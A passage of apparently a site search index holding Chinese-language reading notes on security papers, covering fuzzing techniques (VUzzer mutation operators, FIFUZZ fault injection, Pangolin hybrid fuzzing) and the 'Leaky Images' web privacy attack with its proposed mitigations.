\u53bb\u6389\u4f18\u5148\u7b56\u7565\uff0c\u53bb\u6389conformance\u8fdb\u5316 \u4e09\u8005\u6bd4\u8f83 selective fuzzing \u6bd4\u8f83\u6267\u884c\u901f\u5ea6 \u5176\u4ed6Paper: DigFuzz[45] \u7528\u4e86\u7b26\u53f7\u6267\u884c \u6982\u7387\u8def\u5f84\u4f18\u5148\u6a21\u578b TaintInduce[46]\u53ef\u4ee5\u81ea\u52a8\u63a8\u6d4b\u51fapropagation rules ProFuzzer[42]\u4e5f\u662f\u4e00\u6b21\u53d8\u5f02\u4e00\u4e2a\u5b57\u8282 \u4f46\u53ea\u5173\u6ce8coverage\u53d8\u5316 \u4e0d\u80fd\u63a8\u65ad\u51fa\u6c61\u70b9\u7684\u4f9d\u8d56\u5173\u7cfb \u548cFairFuzz[24]\u90fd\u80fd\u63a8\u65adpartial type of mutated bytes \u4f46\u5bf9\u8fd9\u4e2a\u5206\u652f\u662f\u5426\u5df2\u7ecf\u5230\u8fc7\u662finsensitive\u7684 MutaFlow[26] \u76d1\u6d4bsink APIs\u7684\u53d8\u5316 \u53c2\u6570\u662f\u5426\u88abtainted REDQUEEN[4] \u80fd\u5904\u7406direct copy\u4f46\u4e0d\u80fd\u627e\u5230\u7cbe\u786e\u7684\u4f4d\u7f6e \u9700\u8981\u767e\u6b21\u8fd0\u884c\u6765\u83b7\u5f97a colorized version with higher entropy \u518d\u6d4b\u4e00\u904d\u83b7\u5f97\u4f4d\u7f6e \u6574\u4e2a\u8fc7\u7a0b\u592a\u6162 Intel-laf[1] \u5c06\u957f\u7684\u6bd4\u8f83\u5206\u5272\u6210\u77ed\u7684\u6bd4\u8f83 \u4f46\u662f\u5e26\u6765\u66f4\u591a\u8bed\u4e49\u76f8\u540c\u7684\u8def\u5f84 \u4e0d\u80fd\u5904\u7406\u975e\u5e38\u91cf\u6bd4\u8f83 SYMFUZZ[8] \u53ef\u4ee5\u68c0\u6d4binput bits\u4e4b\u95f4\u7684\u4f9d\u8d56 \u8ba1\u7b97\u51faoptimal mutation ratio VUzzer\u7684\u53d8\u5f02\u64cd\u4f5c \u00b6 https://github.com/vusec/vuzzer/blob/f6f7d593a0e76e86afb3c7af6d5186f897bab979/operators.py#L291 \u8fd9\u91cc\u6211\u4eec\u5206\u6790\u4e00\u4e0bvuzzer\u5b9e\u73b0\u7684\u53d8\u5f02\u64cd\u4f5c\uff0c\u5176\u6240\u6709operators\u4e3a\u4e00\u4e2a\u6570\u7ec4\uff0c\u6bcf\u4e2a\u5143\u7d20\u90fd\u662f\u4e00\u4e2a\u51fd\u6570 \u540c\u4e00\u4e2a\u51fd\u6570\u53ef\u4ee5\u51fa\u73b0\u591a\u6b21\uff0c\u6392\u5e8f\u540e\u5982\u4e0b\u6240\u793a\uff0c\u6211\u6309\u7167\u6211\u7684\u7406\u89e3\u6807\u6ce8\u4e86\u529f\u80fd\uff1a add_random \u9009\u62e9\u4e00\u4e2a\u968f\u673a\u4f4d\u7f6e \u63d2\u5165\u968f\u673a\u5b57\u7b26\u4e32 add_random add_random change_bytes \u6839\u636eTAINTMAP\u4fee\u6539 change_bytes change_random \u9009\u62e9\u4e00\u90e8\u5206\u5b57\u8282\u66ff\u6362\u4e3a\u968f\u673a\u5b57\u7b26\u4e32 change_random change_random_full \u9009\u62e9\u4e00\u90e8\u5206\u5b57\u8282\u66ff\u6362\u4e3a\u968f\u673a\u5b57\u7b26\u4e32\u6216\u4ece\u7a0b\u5e8f\u4e2d\u63d0\u53d6\u51fa\u7684magic bytes change_random_full double_fuzz \u968f\u673a\u9009\u62e9\u4e24\u79cdmutator eliminate_double_null \u5220\u53bb\\0\\0 eliminate_null \u5c06\\0\u66ff\u6362\u4e3aA eliminate_random \u968f\u673a\u5220\u53bb\u4e00\u90e8\u5206 eliminate_random int_slide \u5c06\u7279\u5b9a\u4f4d\u7f6e\u53d8\u4e3a \\xFF\\xFF\\xFF\\xFF \u6216 \\x80\\x00\\x00\\x00 \u6216 \\x00\\x00\\x00\\x00 lower_single_random \u968f\u673a\u53d8\u5f021~100\u6b21\uff1a\u6bcf\u6b21\u9009\u62e9\u4e00\u4e2a\u968f\u673a\u5b57\u7b26\u53d8\u4e3a\u5176-1 raise_single_random \u968f\u673a\u53d8\u5f021~100\u6b21\uff1a\u6bcf\u6b21\u9009\u62e9\u4e00\u4e2a\u968f\u673a\u5b57\u7b26\u53d8\u4e3a\u5176+1 single_change_random \u968f\u673a\u53d8\u5f021~100\u6b21\uff1a\u6bcf\u6b21\u9009\u62e9\u4e00\u4e2a\u968f\u673a\u5b57\u7b26\u53d8\u4e3a\u968f\u673a\u5b57\u7b26 totally_random \u751f\u6210\u4e00\u4e2a\u957f\u5ea6\u5728100~1000\u7684\u5b57\u7b26\u4e32 Leaky Images: Targeted Privacy Attacks in the Web \u00b6 Usenix19 PDF \u653b\u51fb\u8005\u53ef\u4ee5\u77e5\u9053\u7528\u6237\u5728google,onedrive,dropbox\u7684\u767b\u5f55\u8eab\u4efd\uff0c\u901a\u8fc7\u7279\u5b9a\u5206\u4eab\u4e00\u4e2a\u56fe\u7247\u770b\u80fd\u5426\u6210\u529f\u52a0\u8f7d \u5728intro\u91cc\u5c31\u7ed9\u51fa\u4e00\u4e2a\u5438\u5f15\u4eba\u7684\u4f8b\u5b50\uff1a\u7528\u6765\u53bb\u533f\u540d\u5316\u5ba1\u7a3f\u4eba\u2014\u2014\u6536\u96c6\u6240\u6709committe\u7684\u90ae\u7bb1\u5206\u4eab\u56fe\u7247\uff0c\u8bba\u6587\u4e2d\u7ed9\u4e2a\u653b\u51fb\u8005\u7f51\u7ad9\u7684\u94fe\u63a5 \u8868\u683c1\u6bd4\u8f83\u76f8\u5173\u7684\u653b\u51fb\uff1a\u8ffd\u8e2a\u50cf\u7d20\u3001\u793e\u4ea4\u5a92\u4f53\u6307\u7eb9\uff08\u662f\u5426\u767b\u5f55\uff09\u3001CSRF\uff08\u6709\u526f\u4f5c\u7528\uff09\u3001\u672c\u6587Leaky images \u6bd4\u8f83\uff1a\u8c01\u80fd\u653b\u51fb\uff1f \u653b\u51fb\u8005\u80fd\u5b9e\u73b0\u5565\uff1f \u7528\u9014\u573a\u666f \u6240\u6709\u7f51\u7ad9\u90fd\u80fd\u53d1\u8d77\u653b\u51fb\uff0c\u53ef\u4ee5\u51c6\u786e\u627e\u51fa\u53d7\u5bb3\u8005\uff0c\u5b9a\u5411\u7684fine-grained\u53bb\u533f\u540d\u5316 \u7814\u7a76\u4e86250\u4e2a\u6700\u6d41\u884c\u7f51\u7ad9\u768430\u4e2a \u627e\u52308\u4e2a\u7f51\u7ad9\u6709\u6f0f\u6d1e \u624b\u5de5\u627e \u5171\u4eab\u7684\u56fe\u7247\u80fd\u901a\u8fc7\u4e00\u4e2alink\u52a0\u8f7d \u4e14\u53ea\u6709\u7279\u5b9a\u7528\u6237\u80fd\u8bbf\u95ee\uff08\u57fa\u4e8ecookie\u7684\u8bbf\u95ee\u63a7\u5236\uff09 \u8d21\u732e\uff1a \u65b0\u7684\u653b\u51fb \u5b9a\u5411\u9690\u79c1\u653b\u51fb\u6ee5\u7528\u56fe\u7247\u5171\u4eab\u670d\u52a1\u6765\u786e\u5b9a\u53d7\u5bb3\u8005\u662f\u5426\u6b63\u5728\u8bbf\u95ee\u653b\u51fb\u8005\u7684\u7f51\u7ad9 \u8ba8\u8bba\u4e86\u653b\u51fb\u7684\u5404\u4e2a\u53d8\u79cd \u53ef\u4ee5\u653b\u51fbaim at\u5355\u4e2a\u7528\u6237 \u4e00\u7fa4\u7528\u6237 \u4e0d\u540c\u670d\u52a1\u4e4b\u95f4link\u7528\u6237 \u4ee5\u53ca\u4e0d\u9700\u8981js\u7684 \u5c55\u793a8\u4e2a\u6d41\u884c\u7f51\u7ad9\u5b58\u5728\u95ee\u9898 \u8ba9\u7b2c\u4e09\u65b9\u7f51\u7ad9\u80fd\u5b9a\u4f4d\u4ed6\u4eec\u7684\u7528\u6237 \u63d0\u51fa\u591a\u79cd\u7f13\u89e3\u95ee\u9898\u7684\u65b9\u6848\u5e76\u8ba8\u8bba\u4f18\u7f3a\u70b9 Table2 shows a two-dimensional matrix \u6839\u636e\u662f\u5426\u9274\u6743+URL\u662f\u516c\u5f00\u3001\u4e0d\u540c\u7528\u6237\u76f8\u540c\u3001\u4e0d\u540c\u7528\u6237\u4e0d\u540c\u6765\u533a\u5206\uff0c\u53ea\u6709\u9700\u8981\u9274\u6743+\u516c\u5f00url \u548c \u9700\u8981\u9274\u6743+url\u5bf9\u653b\u51fb\u8005\u53ef\u77e5 \u624d\u80fd\u505aLeaky image\u653b\u51fb \u8ba8\u8bba\u90e8\u5206\uff1a\u5728\u65b9\u6cd5\u4e00\u8282\u4e2d\u5c31\u8ba8\u8bbarelated work\uff0c\u6bd4\u8f83\u8ffd\u8e2a\u50cf\u7d20\u3001\u6307\u7eb9\u3001\u5b9a\u5411\u653b\u51fbvs\u5927\u89c4\u6a21\u8ffd\u8e2a\u3002\u5b9a\u5411\u653b\u51fb\u636e\u8bf4\u5bf9\u9ad8\u4ef7\u503c\u53d7\u5bb3\u8005\u8d8a\u6765\u8d8a\u6d41\u884c[37] \u73b0\u5b9emeasurement\u7684\u8ba8\u8bba Our study of \u2026 in real-world sites enables several observations. Leaky images\u662f\u666e\u904d\u7684 prevalent \u53d7\u5bb3\u8005\u751a\u81f3\u4e0d\u4f1a\u6ce8\u610f\u5230\u88ab\u5171\u4eab\u4e86\u4e00\u4e2a\u56fe\u7247 \u53d7\u5bb3\u8005\u4e0d\u80fdunshare \u56fe\u7247\u5171\u4eab\u670d\u52a1\u4f7f\u7528\u4e86\u591a\u79cd\u5b9e\u73b0\u7b56\u7565\u7684\u6df7\u5408 use a diverse mix of implementation strategies \u4e0d\u540c\u7f51\u7ad9\u653b\u51fb\u9762\u4e0d\u540c varies from site to site \u8868\u8fbe\uff1a \u4ec5\u4ec5\u9700\u8981 involve nothing more than \u2026 \u8bc1\u660e\u73b0\u5b9e\u5b58\u5728\u80fd\u5f71\u54cd\u4eca\u5929\u6700\u6d41\u884c\u7f51\u7ad9 Section 4 shows that these cases occur in practice, and that they affect some of today\u2019s most popular websites. \u4e3a\u4e86\u7406\u89e3\u6700\u6d41\u884c\u7f51\u7ad9\u53d7\u5f71\u54cd\u7684\u7a0b\u5ea6 To understand to what extent popular websites are affected by the privacy problem discussed in this paper \u7b2c\u4e00\u4e14\u6700\u91cd\u8981\u7684The first and perhaps most important observation is that \u2026 \u5e0c\u671b\u80fd\u4fc3\u8fdb\u4ee5\u540e\u66f4\u81ea\u52a8\u5316\u7684\u7814\u7a76 We hope that our results will spur future work on more automated analyses that identify leaky images \u8ba8\u8bba\u6bcf\u4e2a\u89e3\u51b3\u65b9\u6848\u4e0d\u8db3 The drawback of this fix is that \u2026 On the downside, implementing this defense may \u2026 However, this mitigation cannot defend against \u2026 require the developers to be aware of the vulnerability in the first place. \u4e8b\u5148\u5c31\u77e5\u9053\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u5b58\u5728 \u548cGDPR\u5f88\u642d\uff0c\u8981\u6c42\u8bbe\u8ba1\u4e0a\u9ed8\u8ba4\u4fdd\u62a4 would be in the spirit of the newly adopted European Union\u2019s Genearl Data Protection Regulation which requires data protection by design and by default. \u9700\u8981\u66f4\u591a\u7814\u7a76\u6765\u6df1\u5165\u5206\u6790\u53ef\u7528\u6027+\u517c\u5bb9\u6027+\u90e8\u7f72\u5f00\u9500\uff0cto aid the browser vendors to take an informed decision, future work should perform an in-depth analysis of all these defenses in terms of usability, compatibility and deployment cost, in the style of \u2026 [9], and possibly propose additional solutions. \u8865\u5145\u4e86\u4e00\u79cd\u65b0\u7684\u653b\u51fbLeaky images adds a privacy-related attack to the set of existing targeted attacks. \u5382\u5546\u4fee\u590d\u8bf4\u660e\u95ee\u9898\u5f88\u91cd\u8981 This feedback shows that the problem we identified is important to practitioners. \u6211\u4eec\u7684\u8bba\u6587\u5e2e\u52a9\u63d0\u9ad8\u5f00\u53d1\u8005\u548c\u7814\u7a76\u8005\u7684\u610f\u8bc6\u4ee5\u540e\u907f\u514d\u8fd9\u4e2a\u95ee\u9898 Our paper helps raising awareness among developers and researchers to avoid this privacy issue in the future. \u6280\u672f\uff1a \u4e0d\u7528onload\u4e5f\u53ef\u4ee5\u53bb\u68c0\u67e5\u5df2\u7ecf\u52a0\u8f7d\u7684\u56fe\u7247\u7684\u5bbd\u9ad8 \u7528 \u5d4c\u5957\u52a0\u8f7d \u5728\u5916\u9762\u7684\u5931\u8d25\u5c31\u4f1a\u52a0\u8f7d\u91cc\u9762\u7684\uff0c\u8fd9\u4e2a\u65b9\u6848\u4e0d\u9700\u8981js \u56fe\u7247\u5206\u4eab\u670d\u52a1\u80fd\u5206\u4eab\u7ed9\u4e00\u6279\u7528\u6237\uff0c\u628a\u6bcf\u4e2a\u53d7\u5bb3\u8005\u7f16\u7801\u6210bit vector\uff0c\u6bcf\u4e2abit\u5173\u8054\u4e00\u4e2a\u56fe encode each victim with a bit vector and to associate each bit with one shared image \u8fd9\u4e2a\u653b\u51fb\u5047\u8bbe\u4e86\u7528\u6237\u5df2\u7ecf\u5728\u6d4f\u89c8\u5668\u767b\u5f55\uff0cSkype\u5927\u90e8\u5206\u7528\u6237\u90fd\u662f\u901a\u8fc7\u7535\u8111\u624b\u673a\u7684client\uff0c\u6240\u4ee5\u8fd9\u4e2a\u653b\u51fb\u7684\u5f71\u54cd\u6709\u9650 hence the impact of this attack is limited to the web users \u6839\u672c\u539f\u56e0 js\u548c\u56fe\u7247\u90fd\u4e0d\u53d7\u540c\u6e90\u7b56\u7565\u5f71\u54cd \u7f13\u89e3\u63aa\u65bd\uff1a \u670d\u52a1\u7aef\uff1a\u8fd9\u4e9b\u65b9\u6cd5\u90fd\u8981\u6c42\u5f00\u53d1\u8005\u9996\u5148\u5c31\u610f\u8bc6\u5230\u8fd9\u79cd\u653b\u51fb\u7684\u5b58\u5728 \u7981\u7528\u57fa\u4e8ecookie\u7684\u9274\u6743\uff0c\u4e0d\u540c\u7528\u6237url\u4e0d\u540c \u4e0d\u8db3\uff1a\u94fe\u63a5\u7684\u79c1\u5bc6\u6027\u53ef\u4ee5\u88abcomrpmised\u5982\u4e0d\u5b89\u5168\u7684\u901a\u9053\uff0c\u6d4f\u89c8\u5668\u7684\u4fa7\u4fe1\u9053\u6216\u8005\u76f4\u63a5\u8ba9\u7528\u6237\u4ee5\u4e0d\u5b89\u5168\u7684\u65b9\u5f0f\u5904\u7406\u94fe\u63a5 \u66f4\u4e25\u683c\u7684cookie\u9274\u6743\uff0c\u4e0d\u540c\u7528\u6237url\u4e0d\u540c \u4e0d\u8db3\uff1a\u5b9e\u73b0\u53ef\u80fd\u56f0\u96be\u8981\u7ef4\u62a4\u7528\u6237\u548curl\u7684\u6620\u5c04\uff0c\u800c\u4e14\u589e\u52a0\u4e86\u65b0\u7684\u8bbf\u95ee\u63a7\u5236\u6027\u80fd\u635f\u8017 \u7528CSRF\u7684\u65b9\u5f0f \u68c0\u67e5origin\u5934 \u4e0d\u8db3\uff1a\u4e0d\u80fd\u9632\u5fa1\u4fe1\u4efb\u57df\u7684\u653b\u51fb Facebook\u4e4b\u524d\u90fd\u5141\u8bb8\u7528\u6237\u8bbe\u7f6ehtml\u4ee3\u7801 \u6d4f\u89c8\u5668\uff1a \u9ed8\u8ba4\u4e0d\u4f7f\u7528cookie\u52a0\u8f7d\u7b2c\u4e09\u65b9\u56fe\u7247 \u53ea\u6709\u5f53\u6d4f\u89c8\u5668\u786e\u5b9a\u9274\u6743\u4e0e\u5426\u4e0d\u5f71\u54cd\u52a0\u8f7d\u56fe\u7247\u7684\u5185\u5bb9 \u6269\u5c55\u5c31\u662f\u9ed8\u8ba4\u7981\u6b62 \u7528csp\u6269\u5c55\u6765\u5141\u8bb8\u53cc\u91cd\u52a0\u8f7d \u7c7b\u4f3c\u4e8eShareMeNot[32] \u5b9e\u73b0\u9ed8\u8ba4\u963b\u6b62\u7b2c\u4e09\u65b9\u56fe\u7247\u8bf7\u6c42 \u9664\u975e\u7528\u6237\u663e\u5f0f\u540c\u610f \u6d4f\u89c8\u5668\u505ainformation flow control \u4fdd\u8bc1\u56fe\u7247\u662f\u5426\u52a0\u8f7d\u6210\u529f\u7684\u4fe1\u606f\u4e0d\u53d1\u7ed9\u670d\u52a1\u5668 \u4f46\u8fd9\u4e2a\u4fa7\u4fe1\u9053\u592a\u591a \u9ad8\u7ea7\u7528\u6237\uff1a \u56fe\u7247\u5171\u4eab\u670d\u52a1\u5546\u5e94\u8be5\u63d0\u4f9b\u7528\u6237\u66f4\u591a\u63a7\u5236\uff0c\u4f8b\u5982\u5e94\u8be5\u51b3\u5b9a\u8c01\u6709\u6743\u9650\u5171\u4eab\u7ed9\u4ed6\uff0c\u4ee5\u53ca\u5f53\u524d\u88ab\u5171\u4eab\u7684\u5217\u8868 \u4f46\u5927\u90e8\u5206\u7528\u6237\u4e0d\u5173\u5fc3while the majority of the users are unlikely to take advantage of such fine-grained controls.","title":"Paper Reading"},{"location":"PaperReading/#paper-reading","text":"","title":"Paper Reading"},{"location":"PaperReading/#fuzzing-error-handling-code-using-context-sensitive-software-fault-injection","text":"USENIX2020 PDF \u8868\u8fbe\uff1a augment \u8bf4\u81ea\u5df1\u7684fuzzer\u80fd\u6709\u6548\u8865\u5145\u589e\u5f3a\u73b0\u6709\u7684fuzzing\u6280\u672f and we are still waiting for the response of remaning ones \u63d0\u4ea4\u4e86bug\u7b49\u5f85\u56de\u590d This manual study is required for gaining the insights into building the automated static analysis \u624b\u5de5\u5206\u6790\u662f\u6709\u5fc5\u8981\u7684 \u9519\u8bef\u5904\u7406\u7684\u4ee3\u7801\u4e00\u4e9b\u53ea\u80fd\u5728\u5076\u7136\u60c5\u51b5\u4e0b\u89e6\u53d1 \u5982\u5185\u5b58\u4e0d\u591f \u7f51\u7edc\u8fde\u63a5\u5931\u8d25 \u8fd9\u7bc7\u6587\u7ae0\u7684\u6838\u5fc3\u662fSFI \u4e0a\u4e0b\u6587\u654f\u611f\u7684\u8f6f\u4ef6\u9519\u8bef\u6ce8\u5165 \u53d1\u73b0\u4e86317\u4e2aalert \u6839\u636e\u6839\u672c\u539f\u56e0\u5206\u621050\u4e2aunique bugs error site \u6ce8\u5165\u9519\u8bef\u7684\u4f4d\u7f6e \u6bd4\u5982malloc \u73b0\u6709\u7684\u6280\u672f\u6ca1\u8003\u8651\u4e0a\u4e0b\u6587\uff08\u8c03\u7528\u6808\uff09\u6ce8\u5165\u9519\u8bef\u90a3\u5c31\u4e00\u5b9a\u4f1a\u9519 \u8fd9\u6837\u4f1a\u9519\u8fc7\u4e00\u4e9bbug \u65b9\u6cd5\uff1a 1. \u9759\u6001\u5206\u6790\u627eerror sites \u8fd0\u884c\u65f6\u6709\u53ef\u80fd\u51fa\u9519\u7684\u5730\u65b9 \u53ea\u627e\u5e93\u51fd\u6570\u907f\u514d\u91cd\u590d\uff1b\u627e\u6ee1\u8db3\u6761\u4ef6\u7684\u51fd\u6570\u8c03\u7528\uff1a\u8fd4\u56de\u7684\u662f\u6307\u9488\u6216\u6574\u6570\u3001\u8fd4\u56de\u503c\u4f1a\u548cNULL\u6216\u80050\u6bd4\u8f83\uff0c\u5b9a\u4e49\u4e00\u4e2a\u6bd4\u8f83\u6b21\u6570/\u603b\u6b21\u6570\u7684\u9608\u503cR=0.6 2. \u8fd0\u884c\u88ab\u6d4b\u7a0b\u5e8f \u6536\u96c6\u5230\u8fbe\u6bcf\u4e2aerror site\u80fd\u6709\u54ea\u4e9bcalling context\uff0c\u4ee5\u53ca\u5f53\u524d\u7684coverage 3. \u521b\u5efa\u9519\u8bef\u5e8f\u5217 \u9519\u8bef\u5e8f\u5217\u7684\u6bcf\u4e00\u4e2a\u4e0d\u662ferror site \u800c\u662ferror point \u5176\u4e2dCallCtx \u662f \u7684\u6570\u7ec4 \u5177\u4f53\u7528\u54c8\u5e0c\u8868\u5b58\u50a8 4. \u53d8\u5f02\u9519\u8bef\u5e8f\u5217 5. \u8fd0\u884c 6. \u770b\u770b\u662f\u5426\u6709\u65b0\u7684coverage \u5faa\u73af \u540c\u65f6\u53d8\u5f02\u9519\u8bef\u5e8f\u5217\u548c\u7a0b\u5e8f\u8f93\u5165 \u8d21\u732e\uff1a * \u505a\u4e86\u4e24\u4e2a\u624b\u5de5\u5206\u6790\uff1a42%\u7684\u9519\u8bef\u5904\u7406\u4ee3\u7801\u90fd\u662f\u5904\u7406\u5076\u7136\u9519\u8bef\uff0c\u5176\u4e2d\u5f88\u5c11\u80fd\u88ab\u73b0\u6709\u7684\u6280\u672f\u89e6\u53d1 * \u57fa\u4e8e\u4e0a\u4e0b\u6587\u654f\u611f\u7684SFI\u7684fuzzing\u57fa\u7840 \u52a8\u6001\u6ce8\u5165\u9519\u8bef\uff0c\u8003\u8651\u4e86\u8c03\u7528\u5173\u7cfb * FIFUZZ \u7b2c\u4e00\u4e2a\u7cfb\u7edf\u6027\u8003\u8651\u4e86\u4e0d\u540c\u8c03\u7528\u5173\u7cfb\u7684\u6d4b\u8bd5\u9519\u8bef\u5904\u7406\u4ee3\u7801\u7684fuzzing\u6846\u67b6 * \u6d4b\u4e869\u4e2aC\u8bed\u8a00\u7a0b\u5e8f \u53d1\u73b0\u4e8650\u4e2abug \u548cAFL AFLFast AFLSmart FairFuzz\u6bd4\u8f83\u80fd\u53d1\u73b0\u5f88\u591a\u522b\u4eba\u53d1\u73b0\u4e0d\u4e86\u7684bug \u867d\u7136\u9519\u8bef\u5076\u7136\u89e6\u53d1\uff0c\u4f46\u5728adversarial setting\u4e0b\u5374\u53ef\u4ee5\u7a33\u5b9a\u89e6\u53d1 \u5982\u653b\u51fb\u8005\u8017\u5c3d\u5185\u5b58\u80fd\u53ef\u9760\u5730\u8ba9malloc\u8fd4\u56deNULL \uff1b\u540e\u9762\u4e5f\u63d0\u5230\u653b\u51fb\u7a97\u53e3\u592a\u5c0f\u7684\u8bdd \u4e0d\u80fd\u6210\u529f \u5206\u6790\u7684\u8f6f\u4ef6\uff1avim bision ffmpeg nasm catdoc clamav cflow gif2png+libpng openssl \u6bcf\u4e2a\u9009100\u4e2a\u6e90\u4ee3\u7801\u770b\u53d1\u73b0\uff1a 42%\u5076\u7136\u9519\u8bef\uff0c70%\u68c0\u67e5\u8fd4\u56de\u503c\u662f\u4e0d\u662f\u8868\u793a\u9519\u8bef \u770bCVE\u53d1\u73b0fuzzing\u53d1\u73b0\u7684CVE\u4e2d31%\u548c\u9519\u8bef\u5904\u7406\u6709\u5173 \u4f46\u53ea\u67099%\u662f\u5076\u7136\u9519\u8bef \u4e00\u6b21\u53d8\u5f02\u4e00\u4e2a \u5982\u679c\u6ca1\u53d1\u73b0\u65b0\u7684coverage\u5c31\u629b\u5f03 ASan\u5f15\u5165\u4e86\u592a\u5927\u7684runtime overhead \u5b9e\u9a8c\u5206\u4e24\u7ec4 \u7528asan\u548c\u4e0d\u7528 \u9009vim\u4e00\u4e2a\u7a0b\u5e8f\u6765\u663e\u793a24\u5c0f\u65f6\u5185 \u6709\u7528\u7684\u9519\u8bef\u5e8f\u5217\u3001\u7a0b\u5e8f\u8f93\u5165\u5206\u522b\u968f\u65f6\u95f4\u589e\u957f\u7684\u66f2\u7ebf \u5b9e\u9a8c\u7ed3\u679c\u7684\u8868\u683c\uff1a\u5206asan\u548c\u4e0d\u7528asan\uff0c\u4ea7\u751f\u4e86\u591a\u5c11\u9519\u8bef\u5e8f\u5217\u548cinput \u591a\u5c11\u6709\u7528\uff0c\u53d1\u73b0\u7684bug\u7684\u5206\u7c7b \u4e09\u7c7b\uff1a\u8fd4\u56deNULL\uff0cmalloc\u5931\u8d25\uff0cassert \u9644\u5f55\u7ed950\u4e2a\u968f\u673a\u9009\u7684alerts \u7a0b\u5e8f\u3001\u89e6\u53d1\u5e8f\u5217Error points\u3001\u5d29\u7684\u6e90\u4ee3\u7801\u884c\u53f7\u3001\u9519\u8bef\u7c7b\u522b\u3001\u53cd\u9988\u4fee\u590d\u72b6\u6001 \u53d1\u73b0\u768446\u4e2a\u548c\u9519\u8bef\u5904\u7406\u76f8\u5173\u7684bug\u4e2d \u53ea\u67094\u4e2a\u9700\u8981\u4e00\u4e2a\u4ee5\u4e0a\u7684bug\u6ce8\u5165 \u4e5f\u5c31\u8bf4\u5927\u90e8\u5206bug\u4e00\u4e2a\u9519\u8bef\u5c31\u80fd\u89e6\u53d1\u4e86\uff1b\u5927\u90e8\u5206bug\u90fd\u662f\u56e0\u4e3a\u88ab\u8c03\u7528\u7684\u51fd\u6570\u6b63\u786e\u5904\u7406\u4e86\u5f02\u5e38 \u4f46\u8c03\u7528\u8005\u6ca1\u6709\u2014\u2014\u5f00\u53d1\u8005\u7ecf\u5e38\u7531\u4e8e\u590d\u6742\u7684\u8c03\u7528\u5728error propagation\u4e0a\u72af\u9519\u8bef \u548c\u5176\u4ed6fuzzer\u6bd4\u8f83 \u8bf4\u81ea\u5df1\u7684coverage\u66f4\u9ad8 \u81ea\u5df1\u6ca1\u6bd4\u4eba\u5bb6\u5f3a\u5c31\u8bf4We believe that if\u6211\u4eec\u4e5f\u5b9e\u73b0\u4ed6\u4eec\u7684fuzzing\u8fc7\u7a0b\uff0c\u90a3\u5c31\u4f1a\u66f4\u597d discussion: \u9519\u8bef\u4f4d\u7f6e\u7684\u63d0\u53d6 \u7684 \u8bef\u62a5\uff1a \u6709\u4e9b\u51fd\u6570\u867d\u7136\u7ecf\u5e38\u8ddf0\u6bd4\u8f83\u4f46\u4e0d\u4f1a\u8fd4\u56de\u9519\u8bef \u5982strstr \u901a\u8fc7\u5206\u6790\u5b9a\u4e49\u548c\u8c03\u7528\u56fe\u68c0\u67e5\u662f\u5426\u771f\u7684\u80fd\u8fd4\u56de\u8868\u793a\u9519\u8bef\u7684\u9519\u8bef\u503c\uff1b\u51fd\u6570\u7684\u8f93\u5165\u4e00\u5b9a\u5148\u8f6c\u6362\u6210\u6709\u6548\u7684\u6570\u636e \u7528\u7b26\u53f7\u6267\u884c\u6765\u5206\u6790 \u5bf9\u6bcf\u4e2a\u51fd\u6570\u8c03\u7528\u8ba1\u7b97\u7ea6\u675f \u9519\u8bef\u68c0\u6d4b \u7684 \u6f0f\u62a5\uff1a\u4e3a\u4e86\u907f\u514d\u91cd\u590d\u6ce8\u5165\u53ea\u8003\u8651\u4e86\u5e93\u51fd\u6570\uff0c\u4f46\u6709\u4e9b\u5f00\u53d1\u8005\u81ea\u5df1\u5199\u7684\u6ca1\u8c03\u7528\u4efb\u4f55\u5e93\u51fd\u6570\u4e5f\u80fd\u8fd4\u56de\u9519\u8bef\uff1bcoverage\u6ca1\u5230 FIFUZZ\u4e0d\u80fd\u63d0\u4f9b\u6240\u6709\u53ef\u80fd\u7684\u7a0b\u5e8f\u8f93\u5165\u548c\u914d\u7f6e\uff1b\u7528ASan\u7684\u5c40\u9650 \u4f46\u53ef\u4ee5\u6269\u5c55\u7528MSan UBSan TSan \u76f8\u5173\u7684paper: \u8f7b\u91cf\u7ea7\u8fd0\u884c\u65f6\u76d1\u6d4b\uff1a\u57fa\u4e8e\u786c\u4ef6\u7684tracing [3, 31]\uff0c call-path inferring[42] \u7528\u9759\u6001\u5206\u6790\u627e\u9519\u8bef\u5904\u7406\u7684bug [28, 32, 33, 37, 53] PairCheck[9] \u7edf\u8ba1\u5206\u6790\u627e\u8d44\u6e90acquire\u548crelease\u7684pair\uff0c\u627e\u9519\u8bef\u5904\u7406\u4e2d\u6ca1\u6709release \u6700\u540econclusion\u6700\u540e\u4e00\u6bb5\u8bf4\u6539\u8fdb \u51cf\u5c11\u8bef\u62a5\uff1b\u63d0\u9ad8\u6027\u80fd\uff1b\u5176\u4ed6\u7f16\u7a0b\u8bed\u8a00 plan to test the program in other programming languages \uff08such as C++ and Java\uff09","title":"Fuzzing error-handling code using context-sensitive software fault injection"},{"location":"PaperReading/#pangolin-incremental-hybrid-fuzzing-with-polyhedral-path-abstraction","text":"SP2020 PDF \u4e00\u53e5\u8bdd\u6982\u62ec\uff1a\u6539\u8fdbQSYM\u6df7\u5408fuzzing \u7f13\u5b58\u6c42\u89e3\u51fa\u6765\u7684\u53d6\u503c\u8303\u56f4\u7528\u591a\u8fb9\u5f62\u8868\u793a \u6765\u66f4\u597d\u7684\u53d8\u5f02\u66f4\u5feb\u7684\u6c42\u89e3 \u5355\u8bcd\u4e0e\u8868\u8fbe\uff1a sluggish \u6027\u80fd\u4e0d\u884c \u592a\u6162 succinct \u7b80\u6d01\u7684 \u53d6\u5f97\u5e73\u8861 a sweet spot between \u2026 obstruct \u963b\u788d we followed the standard instructions in the previous paper \u8bf4\u81ea\u5df1\u7684\u65b9\u6cd5\u662f\u6309\u7167\u522b\u4eba\u5efa\u8bae\u7684 orthogonal \u8bf4\u522b\u4eba\u7684\u7814\u7a76\u548c\u81ea\u5df1\u7684\u4e0d\u51b2\u7a81\u53ef\u4ee5\u4e92\u8865 intro \u7b2c\u4e00\u6bb5 \u4ecb\u7ecdhybrid fuzzing\u5f88\u6709\u7528\uff1b\u7b2c\u4e8c\u6bb5\u8bf4\u73b0\u5728\u7684\u65b9\u6cd5\u4e0d\u884c \u63d0\u51fa\u95ee\u9898\u4e0dincremental \u6700\u540e\u4e00\u53e5\u63d0However, 